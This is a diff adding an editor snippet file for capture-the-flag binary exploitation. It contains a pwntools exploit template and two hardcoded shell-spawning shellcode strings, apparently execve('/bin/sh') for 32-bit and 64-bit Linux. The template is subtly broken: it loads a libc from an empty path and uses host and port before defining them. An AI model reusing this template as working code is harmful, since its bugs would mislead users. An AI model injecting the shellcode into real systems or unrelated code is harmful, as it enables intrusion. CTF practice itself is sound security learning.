@@ -1,0 +1,35 @@
+snippet pwn
+#!/usr/bin/env python
+import os
+import sys
+from pwn import *
+
+elf = ELF('$1')
+libc_path =''
+elf_libc = ELF(libc_path)
+if os.path.exists('./libc.so.6'):
+    libc_path = './libc.so.6'
+else:
+    if elf.arch =='i386':
+        libc_path = '/lib/i386-linux-gnu/libc.so.6'
+    else:
+        libc_path ='/lib/x86_64-linux-gnu/libc.so.6'
+if len(sys.argv) > 1:
+    r = remote(host,port)
+else:
+    r = process('$1',env={'LD_PRELOAD': libc_path})
+context.terminal = ["tmux", "splitw", "-h"]
+context.arch = elf.arch
+host = '1.2.3.4'
+port = 1234
+
+#  gdb.attach(proc.pidof(r)[0])
+
+r.interactive()
+endsnippet
+snippet sc32
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+endsnippet
+snippet sc64
+"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+endsnippet
